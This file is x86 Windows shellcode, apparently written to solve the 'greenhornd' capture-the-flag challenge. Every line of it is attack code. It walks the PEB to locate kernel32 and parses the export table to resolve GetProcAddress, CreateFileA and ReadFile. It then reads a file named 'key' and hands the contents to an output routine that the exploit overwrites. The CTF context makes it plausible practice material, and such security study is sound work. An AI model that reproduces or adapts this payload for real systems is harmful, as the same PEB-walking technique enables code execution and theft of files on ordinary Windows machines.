;greenhornd shellcode to parse PEB

BITS 32
[SECTION .text]

_start:
	push ebp
	mov ebp, esp
	sub esp, 10h

	;save ptr to shellcode in eax
	mov dword [ebp-4], eax

	mov ebx, [fs:30h] ; TEB:30h -> PEB
	mov		ebx, [ebx+0ch] ; _PEB_LDR_DATA
	mov		ebx, [ebx+14h] ; InMemoryOrderModuleList (FLINK, BLINK)
	mov		ebx, [ebx] ; 
	mov		ebx, [ebx]
	mov		ebx, [ebx+10h]
	;ebx at the base of kernel32

	mov		esi, dword [ebx+3ch] ;PE header off
	add		esi, ebx
	mov		esi, dword [esi+78h] ;export table off
	add		esi, ebx
	push	esi
	mov		edi, dword [esi+20h] ;export name table
	add		edi, ebx
	mov		ecx, dword [esi+14h] ; # of exported func

	xor		eax, eax ;counter

findGetProcAddress:
	push	edi
	push	ecx
	mov		edi, dword [edi]
	add		edi, ebx

	; load base address (that's when we pushed eax)
	; then get the address to "GetProcAddress"
	mov		esi, getProcAddressName
	add		esi, dword [ebp-4]

	xor		ecx, ecx
	mov		cl, 0eh
	repe cmpsb
	pop		ecx
	pop		edi

	; Did we find GetProcAddress?
	je		foundGetProcAddress

	add		edi, 4
	inc		eax
	loop	findGetProcAddress

	; If we ever get here, it means that we couldn't find it.
	ud2a

foundGetProcAddress:
	; This calculates the address of `GetProcAddress` from its index in the
	; export name table.
	pop		esi
	mov		edx, dword [esi+24h]
	add		edx, ebx
	shl		eax, 1
	add		eax, edx
	xor		ecx, ecx
	mov		cx, word [eax]
	mov		eax, dword [esi+1ch]
	add		eax, ebx
	shl		ecx, 2
	add		eax, ecx
	mov		edx, dword [eax]
	add		edx, ebx
	; edx is now the address to GetProcAddress

	pop		esi
	mov		edi, esi
	xor		ecx, ecx


doExploit:
	; To make register management easier, just put everything on the stack.
	; It's not like we need a lot of speed anyways.
	mov		dword [ebp-8], edx ; address of GetProcAddress
	mov		dword [ebp-0ch], ebx ; address of Kernel32

	; get pointer to CreateFileA
	mov		esi, createFileAName
	add		esi, dword [ebp-4]
	push	esi
	push	dword [ebp-0ch]
	call	dword [ebp-8]
	; put it in ebx
	mov		ebx, eax

	; call CreateFileA with "key"
	push	79656bh	; 'key\0' as a little-endian integer
	mov	 eax, esp
	push	0
	push	128
	push	3
	push	0
	push	1
	mov	 ecx, 80000000h
	push	ecx
	push	eax
	call	ebx
	add		esp, 4

	; save handle
	push	 eax

	; get pointer to ReadFile
	mov		esi, readFileName
	add		esi, dword [ebp-4]
	push	esi
	push	dword [ebp-0ch]
	call	dword [ebp-8]

	; call ReadFile
	pop		ebx
	sub		esp, 100h
	mov		ecx, esp
	push	0
	push	0
	push	100h
	push	ecx
	push	ebx
	call	eax

	; call WriteOutput
	mov		eax, dword [ebp-4]
	mov		eax, dword [eax+writeOutput]
	push	esp
	call	eax

	; crash.
	ud2a

getProcAddressName	db		"GetProcAddress", 0
createFileAName		db		"CreateFileA", 0
readFileName		db		"ReadFile", 0
writeOutput			dd		0xcccccccc	; meant to be overwritten by exploit